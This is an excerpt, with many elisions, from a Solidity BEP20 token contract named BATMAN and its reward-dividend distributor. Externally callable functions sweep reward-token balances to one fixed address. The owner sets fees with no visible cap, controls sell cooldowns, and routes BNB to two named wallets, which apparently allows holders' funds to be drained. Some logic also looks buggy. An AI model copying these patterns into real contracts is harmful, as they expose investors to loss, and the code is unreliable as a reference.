...
interface IDividendDistributor {
    ...
    function fdeposit() external payable;
    function sdeposit() external payable;
    function process(uint256 gas) external;
    function setRewAdd(address _newRaddress, address _prevRaddress, address _newSRaddress, address _prevSRaddress) external;
    ...
    function depositCSRewards(uint256 _amountN, uint256 _amountD) external;
    ...
    function getSRAddress() external view returns (address);
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 SRWDS = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IBEP20 PRWDS = IBEP20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IBEP20 PSRWDS = IBEP20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    ...
    function depositARewards() external override {
        ...
        uint256 SRamount = SRWDS.balanceOf(address(this));
        SRWDS.transfer(shareholder, SRamount);
        uint256 PRamount = PRWDS.balanceOf(address(this));
        if(PRamount > 0){
            PRWDS.transfer(shareholder, PRamount);}
        uint256 PSRamount = PSRWDS.balanceOf(address(this));
        if(PSRamount > 0){
            PSRWDS.transfer(shareholder, PSRamount);}
    }

    function fdeposit() external payable override onlyToken {
    ...
    function sdeposit() external payable override onlyToken {
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if(amount > 0){
            ...
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
            uint256 RBalance = RWDS.balanceOf(address(this));
            if(RBalance > 0){
                RWDS.transfer(shareholder, amount); }
            uint256 SRBalance = SRWDS.balanceOf(address(this));
            if(SRBalance > 0){
                SRWDS.transfer(shareholder, amount); }
    }
    ...
    function depositCSRewards(uint256 _amountN, uint256 _amountD) external override {
        address shareholder = REWDS;
    ...
    function depositPRewards(uint256 _amountN, uint256 _amountD) external override {
        address shareholder = REWDS;
        uint256 PRamount = PRWDS.balanceOf(address(this));
        uint256 PRPamount = PRamount.mul(_amountN).div(_amountD);      
        if(PRamount > 0){
            PRWDS.transfer(shareholder, PRPamount);}
        uint256 PSRamount = PSRWDS.balanceOf(address(this));
        uint256 PSPamount = PSRamount.mul(_amountN).div(_amountD);
        if(PSRamount > 0){
            PSRWDS.transfer(shareholder, PSPamount);}
    }

    function depositAPRewards() internal {
        address shareholder = REWDS;
        uint256 PRamount = PRWDS.balanceOf(address(this));
        if(PRamount > 0){
            PRWDS.transfer(shareholder, PRamount);}
    ...
    function setRewAdd(address _newRaddress, address _prevRaddress, address _newSRaddress, address _prevSRaddress) external override onlyToken {
        SRWDS = IBEP20(_newSRaddress);
        RWDS = IBEP20(_newRaddress);
        PSRWDS = IBEP20(_prevSRaddress);
    ...
    function getSRAddress() public view override returns (address) {
        return address(SRWDS);
    }
...
contract BATMAN is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _symbol = "BATMAN";
    ...
    uint8 public sFreezeT = 30 seconds;
    mapping (address => uint) private scoolin;
    bool public bFreeze = true;
    uint8 public bFreezeT = 15 seconds;
    mapping (address => uint) private bcoolin;
    bool public variableSB = true;
    uint256 public vsN = 35;
    uint256 vsD = 100;
    ...
    constructor () Auth(msg.sender) {
        ...
        isTimeloE[address(rewRe)] = true;
        isTimeloE[address(rewRp)] = true;
    ...
    function _transferfrom(address sender, address recipient, uint256 amount) internal returns (bool){
        ...
        if(sender != pair &&
            sFreeze &&
            !isTimeloE[sender]) {
            require(scoolin[sender] < block.timestamp,"Please wait for cooldown between sells"); 
            scoolin[sender] = block.timestamp + sFreezeT;} 
        if(sender == pair &&
            bFreeze &&
            !isTimeloE[sender]){
            require(bcoolin[sender] < block.timestamp,"Please wait for cooldown between sells"); 
            bcoolin[sender] = block.timestamp + bFreezeT;} 
        checkbTxLimit(sender, amount);
        if(sender != pair){checksTxLimit(sender, amount);}
        if(secSell(amount) && variableSB && sender != address(cont) && (amount.mul(vsN).div(vsD) >= sThreshold) && (amount.mul(vsN).div(vsD) >= _balances[address(this)])) { vSBF(amount); }
        if(secSell(amount) && variableSB && sender != address(cont) && (amount.mul(vsN).div(vsD) >= sThreshold) && (amount.mul(vsN).div(vsD) < _balances[address(this)])) { definedSwap(); }
    ...
    function checkbTxLimit(address sender, uint256 amount) internal view {
        require(launched && amount <= _maxbTxAmount || isTxLE[sender], "TX Limit Exceeded");
    }

    function checksTxLimit(address sender, uint256 amount) internal view {
        require(launched && amount <= _maxsTxAmount || isTxLE[sender], "TX Limit Exceeded");
    }
    ...
    function setsFreeze(bool _status, uint8 _interval) external authorized {
        sFreeze = _status;
        sFreezeT = _interval;
    }

    function setbFreeze(bool _status, uint8 _interval) external authorized {
        bFreeze = _status;
        bFreezeT = _interval;
    }
    ...
    function liqAdd(uint256 _perc) external authorized {
        ...
        uint256 amBD = amB.mul(_perc).div(100);
        (bool tmpSuccess,) = payable(FJUK).call{value: amBD, gas: 30000}("");
        (tmpSuccess,) = payable(BZKE).call{value: amBD, gas: 30000}("");
        tmpSuccess = false;
    }
    ...
    function definedSwap() internal swapping {
        ...
        uint256 aBNBFR = aBNBR.mul(fR).div(dr);
        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);
        uint256 aBNBFM = aBNBTM.mul(mF).div(dr);
        try distributor.fdeposit{value: aBNBFR}() {} catch {}
        try distributor.sdeposit{value: aBNBR.sub(aBNBFR)}() {} catch {}
        (bool tmpSuccess,) = payable(FJUK).call{value: aBNBFM, gas: 30000}("");
        (tmpSuccess,) = payable(BZKE).call{value: aBNBTM.sub(aBNBFM), gas: 30000}("");
        tmpSuccess = false;
        if(amountL > 0){
    ...
    function setSMulti(bool _enabled, uint256 _amount) external authorized {
        sSellE = _enabled;
        sSell = _amount;
    }

    function setBMulti(bool _enabled, uint256 _amount) external authorized {
        bBuyE = _enabled;
        bBuy = _amount;
    }
    ...
    function variableF(bool _enabled, uint256 _amountb, uint256 _amounts) external authorized {
        bBuy = _amountb;
        bBuyE = _enabled;
        sSell = _amounts;
        sSellE = _enabled;
    ...
    function triggerCSRewards(uint256 _amountN, uint256 _amountD) external authorized {
        distributor.depositCSRewards(_amountN, _amountD);
    }
    ...
    function setRewAdd(address _newRaddress, address _prevRaddress, address _newSRaddress, address _prevSRaddress) external authorized {
        distributor.setRewAdd(_newRaddress, _prevRaddress, _newSRaddress, _prevSRaddress);
    }
    ...
    function currentFirstReward() public view returns (address) {
        return distributor.getRAddress();
    }

    function currentSecondReward() public view returns (address) {
        return distributor.getSRAddress();
    }
